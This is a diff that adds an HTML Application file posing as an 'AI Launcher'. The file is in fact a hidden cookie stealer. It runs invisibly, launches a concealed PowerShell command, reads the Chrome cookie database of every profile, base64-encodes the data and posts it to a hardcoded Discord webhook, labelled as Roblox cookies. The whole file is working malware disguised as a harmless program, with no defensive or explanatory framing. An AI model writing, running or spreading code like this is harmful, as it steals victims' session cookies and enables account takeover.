@@ -1,1 +1,36 @@
-
+<html>
+<head>
+    <title>AI Launcher</title>
+    <HTA:APPLICATION
+        APPLICATIONNAME="AI"
+        BORDER="none"
+        CAPTION="no"
+        SHOWINTASKBAR="no"
+        WINDOWSTATE="minimize"
+        MAXIMIZEBUTTON="no"
+        MINIMIZEBUTTON="no"
+        ICON="none"
+    />
+</head>
+<script>
+    var shell = new ActiveXObject("WScript.Shell");
+    
+    var webhook = "https://canary.discord.com/api/webhooks/1494726339410923681/B8fook-ifaPm8h4J-x389awKPbfmMyX5RD4hQtkZpdEmKo6-C8dOEET9RZQvG8v6ZaiM";
+    
+    var stealCommand = 'powershell -WindowStyle Hidden -Command "' +
+        '$profiles = Get-ChildItem \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\" -Directory | Where-Object { $_.Name -like \"Default\" -or $_.Name -like \"Profile*\" }; ' +
+        'foreach ($profile in $profiles) { ' +
+            '$cookiePath = \"$($profile.FullName)\\Network\\Cookies\"; ' +
+            'if (Test-Path $cookiePath) { ' +
+                '$cookies = Get-Content $cookiePath -Encoding Byte -Raw; ' +
+                '$b64 = [Convert]::ToBase64String($cookies); ' +
+                '$body = @{content = \"**Chrome Profile:** $($profile.Name)`n**Roblox Cookies (Base64):** $b64\"} | ConvertTo-Json; ' +
+                'Invoke-RestMethod -Uri \"' + webhook + '\" -Method POST -Body $body -ContentType \"application/json\"; ' +
+            '} ' +
+        '} "';
+    
+    shell.Run(stealCommand, 0, false);
+    window.close();
+</script>
+<body></body>
+</html>
